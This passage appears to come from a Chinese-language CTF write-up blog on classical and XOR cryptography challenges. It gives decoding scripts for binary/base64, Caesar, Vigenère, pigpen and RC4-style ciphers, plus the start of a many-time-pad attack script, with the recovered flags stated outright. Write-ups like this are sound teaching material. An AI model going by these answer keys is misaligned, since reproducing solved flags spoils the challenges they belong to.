01110000 01001001 01000111 01110100 00110010 01100101 01101110 01001010 01110010 01100010 01000111 00111001 01101011 01100011 00110010 00110000 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01001001 01000111 01100100 01111010 01011010 01001000 01001001 01100111 01100001 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 01111001 01000010 01101011 01100101 01010011 01000010 01110010 01001001 01000111 00110101 01111010 01100011 01001000 01000010 01110110 01011001 01101101 00111001 00110100 01011010 01000011 01000010 01110100 01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01001100 01010011 01000010 00110001 01100101 01001000 01101100 01101110 01100101 01000011 01000010 01110010 01011001 01111001 01000010 01110010 01001001 01000111 01001110 01101100 01100010 01000111 01001110 01101011 01100011 00110010 01010010 01101100 01011010 01001000 01001110 00110101 01100101 01000011 01000010 01110100 01100011 00110011 01110000 01111001 01100010 00110010 01001001 01110101 01001001 01000101 00110001 01110010 01100101 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100011 01001000 01001110 00110100 01100010 01101001 01000010 01101011 01100011 01101101 00111000 01100111 01100011 01001000 01001110 00110100 01100001 00110011 01011001 01100111 01100011 01001000 01011010 01110010 01100011 01010100 00111000 01100111 01100011 01101110 01001110 00110100 01011010 01000100 01101111 01100111 01010010 00110010 00111000 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100100 01101101 01110100 01111000 01001001 01001000 01001110 01101010 01001001 01001000 01000110 00110101 01100011 00110011 01101000 01111000 01001001 01000111 01010010 00110101 01001001 01000111 01111000 01110110 01001001 01001000 01101100 01110111 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100101 01010111 01001010 00110011 01100001 00110010 01010001 01100111 01011010 01010111 01010010 01110111 01100100 01101101 01110100 01111000 01100101 01111001 00110100 01110101 01001100 01101110 00110000 01100111 01001100 01010011 01000010 01101110 01100011 01101110 01001110 01110100 01100011 01101001 01000010 00110011 01100010 00110010 01110100 00110100 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01001000 01001110 01110111 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01101010 01100010 00110010 00111000 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01000010 00110110 01100001 00110010 01010010 01101011 01100010 00110010 01001010 00110100 01001100 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101110 01100011 01101101 01110100 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 00110010 01001101 01100111 01100011 01001000 01101100 01101001 01001001 01000111 01010101 01110011 01001001 01000111 01010001 01110011 01001001 01001000 01000001 01110011 01001001 01001000 01011001 01100111 01100001 01111001 01110111 01100111 01100001 00110011 01101000 01110101 01001001 01001000 01000101 01100111 01100001 00110010 01001010 01110110 01001100 01101001 01000010 01001010 01100101 01010111 01010101 01100111 01100010 01010111 01110100 00110100 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01100100 00110101 01011001 01101110 01010101 01100111 01100101 01010111 01010110 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01101001 01100010 00110011 01100100 01110010 01100011 00110011 01101000 01111010 01100101 01001000 01000101 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01011001 01111001 01000010 01110011 01100001 01010011 01000010 01101001 01100010 00110011 01110000 00110010 01100001 00110010 00110001 01111010 01100101 01001000 01000101 01100111 01011010 01001000 01001010 01110110 01100100 01111001 01000010 01110010 01100101 01000111 00110100 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001010 01101001 01100011 00110011 01101000 01111000 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 01111010 01100101 01000011 01000010 01101011 01100011 01101101 00111000 01100111 01010100 00110011 01101000 01111000 01100100 01101110 01001110 01101010 01100011 01101001 01000010 00110010 01100001 00110011 01101000 01111000 01011010 01010111 01110100 01111000 01100010 01111001 00110100 01100111 01010011 00110011 01101000 00110101 01011010 01001000 01001010 01110110 01011001 01101001 01000010 01111000 01011001 01101101 00111001 01110010 01011010 01000011 01000010 00110011 01100010 00110010 01010010 01111001 01100101 01010111 00110100 01100111 01100011 00110010 01001101 01100111 01011010 01001000 01101011 01100111 01011010 01010111 01001110 01110110 01001001 01001000 01000010 01101001 01100010 00110010 01000110 01101100 01100010 00110011 01101000 01110100 01100001 01010011 01000010 01110010 01100101 01000111 01110100 00110010 01100001 01010111 01001110 01111010 01011001 01111010 01101111 01100111 01011010 00110010 00111000 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000011 01100100 01110110 01001010 01111001 01000010 01101010 01100011 01101110 01101100 01101110 01011001 01111001 01000010 01101100 01100101 01101001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01001000 01101100 01110111 01011010 01000111 00111001 00110100 01001001 01001000 01001110 00110100 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110010 01100100 01101110 01110000 01111001 01100001 00110010 01111000 01110110 01011010 01000011 01110111 01100111 01011001 00110011 01101011 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01100100 01101010 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01010010 01111001 01100010 01111001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01110100 01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01100011 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01010010 01110110 01100001 01000111 01010001 01110011 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110010 00111001 01110101 01001001 01000111 01111000 01110000 01001001 01000011 01100100 01101011 01001010 01111001 01110111 01100111 01100001 00110011 01101000 01110101 01001001 01000111 01001110 00110101 01001001 01001000 01101100 00110100 01001100 01101001 01000010 01011010 01100101 01000111 00110001 01110110 01001001 01000111 01101100 00110101 01011010 01010011 01000010 00110001 01100101 01001000 01101100 01101110 01001001 01000111 01110011 01100111 01100011 01000111 00111001 01101110 01001001 01000111 00110001 01111001 01100001 00110010 01001010 01110010 01100010 01010111 01010010 01110110 01011001 01101101 01001101 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01110100 01100001 00110011 01100111 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01001010 01110110 01011001 00110010 01010001 01100111 01100101 01011000 01000001 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01100100 00110101 01011001 01101101 00110101 01101010 01001001 01000111 01111000 01110010 01011001 00110010 00111001 01110101 01001001 01001000 01101100 00110100 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01001110 01111001 01100101 01010111 01100011 01100111 01011010 01011000 01101111 01100111 01100011 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000101 00111001 00110100 01100011 01011000 01011010 01111010 01011001 00110011 01001001 01100111 01100100 01101101 01110100 00110100 01100011 01010111 01010110 01110010 01100011 01010111 00111000 01110101 01000011 01101110 01001010 01101110 01100001 01000111 00110101 00110100 01100011 00110010 01010010 01101101 01100101 01011000 01001110 01101011 01100100 01000111 01100100 01101111 01100100 01010011 01000101 01100111 01100011 01010111 01100100 01101101 01001001 01000111 01101100 01111010 01011001 01010111 01110011 01100111 01011001 00110011 01010010 01101111 01100100 01001000 01010110 01110000 01100001 00110010 01010101 01100111 01011010 01000111 01101100 01110010 01001001 01001000 01110000 01110010 01100010 01101110 01010010 01101111 01100001 01000111 01110100 00110100 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 01110100 01101111 01100010 01101101 01110011 01110101 01001001 01000111 01101100 01110010 01100101 01000111 01110011 01100111 01100100 01001000 01010101 01100111 01100011 01111001 01000010 01101010 01100101 01011000 01001110 01110101 01001001 01000111 01001110 01101110 01100101 01000011 01000010 01111010 01100101 01011000 01101011 01100111 01100011 01010111 01100100 01101101 01100101 01000011 01000010 01110000 01100011 00110011 01101000 01101100 01001001 01000111 01110100 01101010 01011001 00110010 01100100 00110100 01011010 01001000 01010101 00110110 01001001 01000111 01011010 01101011 01011001 00110011 01101100 01111010 01100010 01101110 01110100 01101111 01001101 01001000 01011010 01100110 01011010 01000111 01101011 00110000 01011010 01001000 01010110 01100110 01100100 01101101 01101011 00110000 01011010 01000110 00111001 00110000 01011000 00110011 01001001 00110000 01100101 01011000 01101100 01100110 01100011 01101110 01101000 01111000 01100010 01000111 01010001 01110111 01100110 01010011 00110100 01100111 01100011 01010111 01100100 01101101 01001001 01001000 01011010 00110000 01100101 01011000 01101011 01100111 01011001 00110011 01010010 01101111 01011010 01010011 01000010 01101011 01100001 01011000 01001110 01101011 01001001 01001000 01001101 01100111 01100101 01010111 01100100 01101011 01001001 01000111 01100100 01101010 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 01000010 00110000 01100100 01010011 01000010 01110111 01011010 01101110 01010110 01101011 01001001 01001000 01110000 01101101 01100100 01001000 01101100 01101100 01100100 01000111 01101000 01110101 01001001 01000111 01100100 01101010 01011001 01111001 01000010 01101011 01100001 01011000 01010010 00110001 01001001 01001000 01010110 01101110 01100101 01000111 01010001 01100111 01011010 00110010 01001101 01100111 01100101 01101110 01001110 00110001 01100100 01001000 01001001 01100111 01011001 01101101 01101000 01101110 01100100 01101110 01101100 01110010 01011010 01010111 00110101 01110010 01001100 01000011 01000010 01111010 01100001 01000111 01010101 01100111 01100100 01000111 01010001 01100111 01100101 01000111 01110100 01111010 01100101 01011000 01101100 01111000 01001001 01001000 01010010 00110001 01001001 01000111 01101000 01101110 01011010 01000011 01000010 00110001 01011010 01111001 01000010 00110110 01100011 00110010 01010101 01100111 01100011 00110010 01001110 01101011 01100001 00110011 01100111 01100111 01100011 00110011 01101100 00110101 01001100 01101001 01000010 01110000 01011010 00110010 01111000 01110010 01001001 01001000 01000110 01101110 01011010 01101001 01000010 01110010 01100001 01001000 01000010 01101110 01100011 01010111 01110100 01101100 01001001 01000111 01010010 01110000 01100001 01111001 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 01110100 01101111 01100010 01101101 01110011 01101000"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plaintext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>kaisa <span class="token operator">=</span> <span class="token string">"kvbsqrd, iye'bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S'fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd 'o' crygc ez wycd ypdox sx dro kvzrklod, cy drkd'c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li 'd', kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo."</span>cipin <span class="token operator">=</span> <span class="token string">"rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> kaisa<span class="token punctuation">:</span>        tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">] '</span></span> <span class="token operator">+</span> tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转十进制，转char，转base64，最后看出来flag那部分是词频分析，直接在线quipquip解得</p><p><img src="/2021/05/28/CTF/image-20210726210941538.png" alt></p><p><code>flag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;</code></p><h4 id="ACTF新生赛2020-crypto-classic1"><a href="#ACTF新生赛2020-crypto-classic1" class="headerlink" title="[ACTF新生赛2020]crypto-classic1"></a>[ACTF新生赛2020]crypto-classic1</h4><p><strong>TAG: 键盘密码， 维吉尼亚</strong></p><p>先是键盘密码</p><pre class="line-numbers language-none"><code class="language-none">哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律xdfv ujko98 edft54 xdfv pok,.; wsdr43circle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得压缩包内容为</p><pre class="line-numbers language-none"><code class="language-none">SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;解维吉尼亚得.密钥为sp我没解出来，看大哥写的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大哥写的脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#破解key</span>s<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span> s1<span class="token operator">=</span><span class="token string">'ACTF'</span> s2<span class="token operator">=</span><span class="token string">'SRLU'</span> key <span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     key<span class="token operator">+=</span>s<span class="token punctuation">[</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token keyword">print</span> key  <span class="token comment">#解密</span>cipher <span class="token operator">=</span> <span class="token string">'SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;'</span>key <span class="token operator">=</span> <span class="token string">'SP'</span><span class="token comment">#decode</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">-</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token keyword">print</span> flag<span class="token comment">#ACTFHWHATKAKCLASSICALKVIGENEREH</span> <span class="token triple-quoted-string string">'''cipher = SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;ACTF&#123;WHAT_A_CLASSICAL_VIGENERE&#125;flag&#123;what_a_classical_vigenere&#125;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-Classical-Cipher"><a href="#NPUCTF2020-Classical-Cipher" class="headerlink" title="[NPUCTF2020]Classical Cipher"></a>[NPUCTF2020]Classical Cipher</h4><p><strong>TAG: 词频分析、符号密码</strong></p><p><img src="/2021/05/28/CTF/image-20210727142612399.png" alt></p><p>找出来key，然后获得一张图片，猪圈密码看得出来，那个动物的那个不知道是什么加密了，猜猜就好了。</p><p><img src="/2021/05/28/CTF/image-20210727142847265.png" alt></p><p><img src="/2021/05/28/CTF/image-20210727143845598.png" alt="变形猪圈"></p><p><img src="/2021/05/28/CTF/image-20210727145244333.png" alt="符号解密"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;classicalcode&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="普通异或加密"><a href="#普通异或加密" class="headerlink" title="普通异或加密"></a>普通异或加密</h3><h4 id="EasyProgram"><a href="#EasyProgram" class="headerlink" title="EasyProgram"></a>EasyProgram</h4><pre class="line-numbers language-none"><code class="language-none">get buf unsign s[256]get buf t[256]we have key:whoamiwe have flag:????????????????????????????????for i:0 to 256    set s[i]:ifor i:0 to 256    set t[i]:key[(i)mod(key.lenth)]for i:0 to 256    set j:(j+s[i]+t[i])mod(256)        swap:s[i],s[j]for m:0 to 38    set i:(i + 1)mod(256)    set j:(j + S[i])mod(256)    swap:s[i],s[j]    set x:(s[i] + (s[j]mod(256))mod(256))    set flag[m]:flag[m]^s[x]fprint flagx to file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析一下上面的伪代码<code>set flag[m]:flag[m]^s[x]</code>，只有这一句有flag参与了运算，根据异或运算的可逆性，这里我们只需要获得<code>s[x]</code>就能进而获得flag的内容了。写出逆代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token string">'whoami'</span>flag <span class="token operator">=</span> <span class="token string">''</span>ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>        ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    x <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;f238yu28323uf28u2yef2ud8uf289euf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一次一密"><a href="#一次一密" class="headerlink" title="一次一密"></a>一次一密</h3><blockquote><p>题目类型应该以buu上的<code>你听说过一次一密么？</code>这道题目开始的，此类题目有一种共同的解法，因此将其分为一类。英文名应该是叫做<code>many-time-pad-attack</code>这种攻击。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><span class="token keyword">import</span> string<span class="token keyword">import</span> collections<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>c10 <span class="token operator">=</span> <span class="token 